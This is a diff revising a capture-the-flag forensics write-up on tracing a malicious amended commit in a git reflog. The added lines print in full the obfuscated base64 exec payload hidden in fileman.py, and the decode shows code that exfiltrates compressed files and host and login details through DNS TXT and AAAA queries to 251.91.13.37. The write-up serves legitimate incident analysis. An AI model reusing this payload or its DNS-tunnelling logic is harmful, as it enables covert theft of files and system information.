@@ -8,24 +8,24 @@ The software responsible for the data exfiltration is one of Personalyz.io's int
 
 Find the commit ID where the malicious change was performed and obtain the malicious IP address.
 
-## Committed to finding this commit
+## Finding this commit
 
-Time to get more familiar with git:
+Getting more familiar with git:
 
-- .git directory: this contains all the metadata and object database for a project to manage the version history
-- `reflog` (found in `logs/HEAD`): reference log locally records every update to the HEAD (pointer to the current commit), branches, and other references - including commits, checkouts, resets, and rebases
+- `.git` directory: this contains all the metadata and object database for a project to manage the repo version history
+- `reflog` (found in `logs/HEAD`): the reference log locally records every update to the HEAD (pointer to the current commit), branches, and other references - including commits, checkouts, resets, and rebases
   - This is notably different from `git log`, which shows the linear commit history by recursively traversing the parent commits
 
-Even with limited background in Git, I recognized that `reflog` was going to be important in this challenge. However, I only realized after several hours of going down rabbit holes that my initial understanding of the `reflog` was not accurate, and that was the key to getting back on the right track.
+Even with limited background in git, I recognized that `reflog` was going to be important in this challenge. However, I only realized after several hours of going down rabbit holes that my initial understanding of the `reflog` output was not accurate, and this was the key for me to get back on the right track.
 
 ![reflog](./reflog.png)
-The first line shows that `malbye` (most likely the threat actor) had cloned backupy.git as observed in the previous challenge. Scrolling through the `reflog` output confirms that it is being displayed in chronological order (the version numbers are increasing). So, after cloning the repo, a rebase occurred, which rewrote the commit history by reapplying one branch `https://github.com/elesiuta/backupy.git` onto this branch. This was almost certainly performed to hide something suspicious. All subsequent actions shown in the `reflog` are rebase actions, except there was one commit (amend) action:
+The first line shows that `malbyte` (the threat actor) had cloned `backupy.git` as observed in the previous challenge. Scrolling through the `reflog` output confirms that it is being displayed in chronological order (the version numbers are increasing). So, after cloning the repo, a rebase occurred, which rewrote the commit history by reapplying one branch `https://github.com/elesiuta/backupy.git` onto this branch. This was almost certainly performed to hide something suspicious. All subsequent actions shown in the `reflog` are rebase actions, except there was one `commit (amend)` action:
 
 ```
 a50a7657e3a00c0aa63455d7ac81e73f69f273b1 b188b42c34f772d2d9ccc006692d65cd597fc57d erik <elesiuta@gmail.com> 1748528038 -0500	commit (amend): deprecate copy_function class attribute for newer FileOps
 ```
 
-Using a git bash terminal, I navigated to the location of the .git directory and entered the following commands to inspect the repository at the point of that specific commit, then used `git show b188b42c34f772d2d9ccc006692d65cd597fc57d` to display the commit details, including the textual diff that shows the changes made in that commit. The diff shows that `fileman.py` was modified to include a long encoded string:
+Using a git bash terminal, I navigated to the location of the `.git` directory and entered `git show b188b42c34f772d2d9ccc006692d65cd597fc57d` to display the commit details, including the textual diff showing the changes made in that commit. The diff shows that `fileman.py` was modified to include a long encoded string:
 
 ``` diff
 diff --git a/backupy/fileman.py b/backupy/fileman.py
@@ -61,7 +61,12 @@ index 7461804..126a027 100644
 ```
 ## Decoding
 
-I performed Base64 decoding on the string.
+I performed base64 decoding on the string.
+
+Encoded string:
+```python
+exec(ute("ZXhlYyh1dGUoIlpuSnZiU0JpWVhObE5qUWdhVzF3YjNKMElIVnliSE5oWm1WZllqWTBaVzVqYjJSbCIpKQpleGVjKHV0ZSgiWm5KdmJTQnBieUJwYlhCdmNuUWdRbmwwWlhOSlR3PT0iKSkKZXhlYyh1dGUoIlpuSnZiU0JrYm5NdWJXVnpjMkZuWlNCcGJYQnZjblFnYldGclpWOXhkV1Z5ZVE9PSIpKQpleGVjKHV0ZSgiWm5KdmJTQmtibk11Y1hWbGNua2dhVzF3YjNKMElIVmtjQT09IikpCmV4ZWModXRlKCJabkp2YlNCNmJHbGlJR2x0Y0c5eWRDQmpiMjF3Y21WemN3PT0iKSkKZXhlYyh1dGUoIlpHVm1JSEVvYzJRc0lIUXBPZ29nSUNBZ2RXUndLRzFoYTJWZmNYVmxjbmtvWmlKN2MyUjlJaXdnZENrc0lDSXlOVEV1T1RFdU1UTXVNemNpTENCd2IzSjBQVEJ2TmpVcCIpKQpleGVjKHV0ZSgiWHlBOUlFSjVkR1Z6U1U4b2RYSnNjMkZtWlY5aU5qUmxibU52WkdVb1kyOXRjSEpsYzNNb2IzQmxiaWh6YjNWeVkyVXNJQ2R5WWljcExuSmxZV1FvS1NrcEtRPT0iKSkKZXhlYyh1dGUoImQyaHBiR1VnWDE4Z09qMGdYeTV5WldGa0tEQnZOemNwTG1SbFkyOWtaU2dwTG5OMGNtbHdLQ0k5SWlrNkNpQWdJQ0JsZUdWaktIVjBaU2dpWTFOb1psaDVkMmROUnpoNVRVTnJQU0lwS1E9PSIpKQpleGVjKHV0ZSgiWHlBOUlHWWllMjl6TG5WdVlXMWxLQ2t1YzNsemJtRnRaWDB1ZTI5ekxuVnVZVzFsS0NrdWJXRmphR2x1WlgwdWUyOXpMblZ1WVcxbEtDa3VibTlrWlc1aGJXVjlMbnR2Y3k1blpYUnNiMmRwYmlncGZTST0iKSkKZXhlYyh1dGUoImNTaGZMQ0F3YnpFcCIpKQpleGVjKHV0ZSgiY1NoemIzVnlZMlVzSURCdk16UXAiKSk="))
+```
 
 First round of decode:
 
@@ -87,7 +92,15 @@ from base64 import urlsafe_b64encodefrom io import BytesIOfrom dns.message impor
 f"{os.uname().sysname}.{os.uname().machine}.{os.uname().nodename}.{os.getlogin()}"_ = f"{os.uname().sysname}.{os.uname().machine}.{os.uname().nodename}.{os.getlogin()}"q(source, 0o34)
 ```
 
-We can see that this code is sending DNS queries over UDP to IP address `251.91.13.37` on port DNS (0o65 = octal 65 = decimal 53).
-It reads and compresses a file, encodes it as base64, and splits it into chunks. Those chunks get embedded in DNS TXT queries (0o20 = octal 20 = decimal 16 = TXT record type; specific decimal numbers are assigned to represent different DNS record types, and 16 corresponds to TXT). System information gets sent in a DNS AAAA query (0o34 = octal 34 = decimal 28 = AAAA record type).
+This code is sending DNS queries over UDP to IP address `251.91.13.37` on port DNS. It reads and compresses a file, encodes it as base64, and splits it into chunks. The chunks get embedded in DNS TXT queries. System information gets sent in a DNS AAAA query.
 
 **Flag:** ```251.91.13.37```
+
+## Appendix
+
+Octal number conversions:
+
+- 0o65 = octal 65 = decimal 53 - port 53 is a common port for DNS
+Note that specific decimal numbers are assigned to represent different DNS record types.
+- 0o20 = octal 20 = decimal 16 = TXT record type
+- 0o34 = octal 34 = decimal 28 = AAAA record type
